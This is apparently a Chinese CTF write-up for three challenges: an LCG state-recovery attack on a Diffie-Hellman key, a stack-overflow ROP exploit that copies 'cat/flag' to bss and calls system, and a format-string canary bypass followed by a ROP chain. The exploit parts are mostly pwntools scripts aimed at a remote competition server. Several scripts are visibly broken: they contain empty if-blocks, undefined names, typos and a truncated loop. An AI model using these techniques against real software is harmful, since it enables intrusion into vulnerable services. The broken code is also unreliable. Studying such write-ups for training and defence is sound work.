    easyLCG¶

    考点：LCG简单利用

    比较简单的LCG，通过output枚举出s1，然后通过s1求出s2，进而s3也能被预测：

    from Crypto.Util.number import *
a = 3844066521
b = 3316005024
m = 2249804527

for i in range(65536):
    s1 = int(bin(16269)[2:]+bin(i)[2:].zfill(16),2)
    s2 = (s1*a + b)%m
    if s2 >> 16 == 4249:
        print s1

    然后改一下加密脚本就能求出key：

    from Crypto.Util.number import *
class lcg:
    def __init__(self):
        self.a = 3844066521
        self.b = 3316005024
        self.m = 2249804527
        self.seed = 278490266
    def next(self):
        self.seed = (self.a*self.seed+self.b) % self.m
        return self.seed>>16
class DH:
    def __init__(self):
        self.lcg = lcg()
        self.g = 183096451267674849541594370111199688704
        self.m = 102752586316294557951738800745394456033378966059875498971396396583576430992701
        self.A, self.a = self.gen_AB()
        self.B, self.b = self.gen_AB()
        self.key = pow(self.A, self.b, self.m)
    def gen_AB(self):
        x = ''
        for _ in range(64):
            x += '1' if self.lcg.next() % 2 else '0'
        return pow(self.g, int(x, 2), self.m), int(x, 2)

    Secret2¶

    每循环一次都会打开一次设备，而linux默认情况下最多只能打开1024个设备，所以当打开超过1024以后，将会打开失败，而读取打开失败的文件设备读入数据将会是零。

    程序还存在一个栈溢出漏洞，但是关闭了输入设备，所以我们的payload要一次性就可以获得flag，我们主要到程序中有一个字符串cat/flag，如果我们可以将这个字符串拷贝到bss段，并将/替换为空格，那我们就可以利用system来获得flag。刚好我们有memcpt，memset函数可以使用，接下来需要解决的问题就是去控制rdi，rsi，rdx三个寄存器的值，程序没有pop rdx；ret这样的gadget，所以我们只能利用libc_scu_init来执行函数，这里要注意灵活组合payload，不要浪费任何一个字节，因为用libc_sct_init来执行函数的话，需要的溢出空间比较大，而我们只能溢出0x100-9的地址，所以要好好的组合。

    from pwn import *
from LibcSearcher import *
if args['REMOTE']:
    sh=remote('183.129.189.60',10051)
else:
    sh=process('./pwn')

if args['I386']:

if args['DEBUG']:
    context.log_level='debug'

#make payload
bss=0x00000000004040A8
pop6_ret=0x401612

memset=0x0000000000404040
rdi_ret=0x000000000040161b
system=0x0000000000401060
def make_payload(rdi,rsi,rdx,func):
    p=p64(0)+p64(1)+p64(func)+p64(rdi)+p64(rsi)+p64(rdx)
    p+=p64(begin)
    return p
payload='\x00'*9
#1
payload+=p64(pop6_ret)+make_payload(bss,0x0000000004021DB,8,memcpy)
#2
payload+=p64(0)+make_payload(bss+3,0x20,1,memset)
payload+=p64(0)*7+p64(rdi_ret)+p64(bss)+p64(system)
print len(payload)
sh.recvuntil('name?')
sh.send(payload)
#bypass secret
while True:

    easybabystack¶

    这道题利用了格式化字符串*的特性。

    *可以用参数来计算占位符的宽度。如:%*2$c，就是用第二个参数的值来决定这个格式化字符的宽度。利用这一特性我们就可以输出和canary一样大小的字符进而用%n修改变量来bypass。

    from pwn import *
from LibcSearcher import *
if args['REMOTE']:
    sh=remote('183.129.189.60',10001)
else:
    sh=process('./easybabystack')

if args['I386']:
    context.arch='i386'
else:
    context.arch='amd64'

if args['DEBUG']:
    context.log_level='debug'
# gdb.attach(sh,'''
# b*0x00000000004016C7
# c
#   ''')
start=0x0000000000401710
pop6_ret=0x00000000040172A
read_plt=0x0000000000404038
bss=0x00000000004040C8+0x10
system=0x000000000401040
rdi_ret=0x0000000000401733
def make_payload(rdi,rsi,rdx,addr):
    p=p64(pop6_ret)+p64(0)+p64(1)+p64(rdi)+p64(rsi)+p64(rdx)+p64(addr)
    p+=p64(start)+p64(0)*7
    return p
sh.recvuntil('name:')
sh.sendline('%*18$c%5$n')
sh.recvuntil('passwd:')
a=0xfe
sh.sendline(str(a))
sh.recvuntil('message:')
payload='a'*0x118
payload+=make_payload(0,bss,0x10,read_plt)
payload+=p64(rdi_ret)+p64(bss)+p64(system)
sh.sendline(payload)
sh.interactive()
